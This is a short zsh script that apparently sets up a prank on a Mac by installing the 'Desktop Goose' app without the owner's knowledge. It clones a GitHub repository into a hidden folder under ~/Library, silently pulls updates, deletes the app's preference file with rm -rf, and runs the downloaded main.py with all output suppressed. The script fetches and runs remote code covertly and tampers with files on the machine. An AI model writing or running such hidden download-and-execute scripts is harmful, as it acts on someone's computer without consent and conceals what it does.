#!/bin/zsh

if [[ ! -d "desktopgoose.app" ]]
then
git clone https://github.com/k34n4y138/goosetroll ~/Library/.geezehidden && cd ~/Library/.geezehidden
fi
git pull &> /dev/null &&  rm -rf ~/Library/Containers/net.namedfork.DesktopGoose/Data/Library/Preferences/net.namedfork.DesktopGoose.plist && python3 ~/Library/.geezehidden/main.py &> /dev/null
